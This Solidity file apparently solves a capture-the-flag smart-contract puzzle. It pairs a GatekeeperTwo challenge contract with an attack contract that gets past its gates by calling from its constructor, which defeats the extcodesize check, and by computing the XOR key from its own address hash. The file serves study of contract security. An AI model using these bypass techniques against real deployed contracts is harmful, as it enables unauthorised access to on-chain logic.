// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwoHack {
    GatekeeperTwo private immutable gate;

    constructor(address _target) {
        gate = GatekeeperTwo(_target);

        bytes8 _gateKey = ~bytes8(keccak256(abi.encodePacked(address(this)))) & bytes8(type(uint64).max);
        require(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(_gateKey) == type(uint64).max, "Error");
        (bool _success) = gate.enter(_gateKey);
        _success;
    }
}

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}